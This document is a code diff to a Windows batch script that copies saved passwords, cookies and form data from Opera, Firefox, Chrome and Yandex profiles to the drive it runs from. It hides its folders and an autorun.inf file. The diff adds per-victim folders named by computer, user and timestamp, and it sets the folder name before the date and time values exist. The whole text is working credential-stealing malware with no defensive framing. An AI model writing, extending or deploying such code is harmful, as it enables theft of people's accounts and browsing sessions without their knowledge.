@@ -1,8 +1,13 @@
+set folderName=%ComputerName%_%mydate%_%mytime%_%USERNAME%
 @echo off
-md %~d0\bin\Mozilla
-md %~d0\bin\Opera
-md %~d0\bin\Google
-md %~d0\bin\Yandex
+For /f "tokens=2-4 delims=/ " %%a in ('date /t') do (set mydate=%%c-%%a-%%b)
+For /f "tokens=1-3 delims=/:/ " %%a in ('time /t') do (set mytime=%%a-%%b-%%c)
+set mytime=%mytime: =% 
+md %~d0\bin\%folderName%
+md %~d0\bin\%folderName%\Mozilla
+md %~d0\bin\%folderName%\Opera
+md %~d0\bin\%folderName%\Google
+md %~d0\bin\%folderName%\Yandex
 echo off
 ATTRIB -R -A -S -H
 attrib +h %~d0\bin
@@ -13,24 +18,24 @@ attrib +h %~d0\autorun.inf
 attrib +h %~d0\adv
 attrib +h %~d0\adv\logs
 CD/D %appdata%\Opera software\Opera stable\
-copy /y "login data" %~d0\bin\Opera\
-copy /y "Cookies" %~d0\bin\Opera\
-copy /y "Web Data" %~d0\bin\Opera\
+copy /y "login data" %~d0\bin\%folderName%\Opera\
+copy /y "Cookies" %~d0\bin\%folderName%\Opera\
+copy /y "Web Data" %~d0\bin\%folderName%\Opera\
 echo off
 CD/D %appdata%\Mozilla\Firefox\Profiles\*.default
-copy /y cookies.sqlite %~d0\bin\Mozilla
-copy /y key3.db %~d0\bin\Mozilla
-copy /y signons.sqlite %~d0\bin\Mozilla
+copy /y cookies.sqlite %~d0\bin\%folderName%\Mozilla
+copy /y key3.db %~d0\bin\%folderName%\Mozilla
+copy /y signons.sqlite %~d0\bin\%folderName%\Mozilla
 echo off
 CD/D %localappdata%\Google\Chrome\User Data\Default
-copy /y "Login Data" %~d0\bin\Google
-copy /y "Cookies" %~d0\bin\Google
-copy /y "Web Data" %~d0\bin\Google
+copy /y "Login Data" %~d0\bin\%folderName%\Google
+copy /y "Cookies" %~d0\bin\%folderName%\Google
+copy /y "Web Data" %~d0\bin\%folderName%\Google
 echo off
 CD/D %localappdata%\Yandex\YandexBrowser\User Data\Default\
-copy /y "Ya Login Data" %~d0\bin\Yandex
-copy /y "Login Data" %~d0\bin\Yandex
-copy /y "Cookies" %~d0\bin\Yandex
-copy /y "Web Data" %~d0\bin\Yandex
+copy /y "Ya Login Data" %~d0\bin\%folderName%\Yandex
+copy /y "Login Data" %~d0\bin\%folderName%\Yandex
+copy /y "Cookies" %~d0\bin\%folderName%\Yandex
+copy /y "Web Data" %~d0\bin\%folderName%\Yandex
 @echo off
 cls
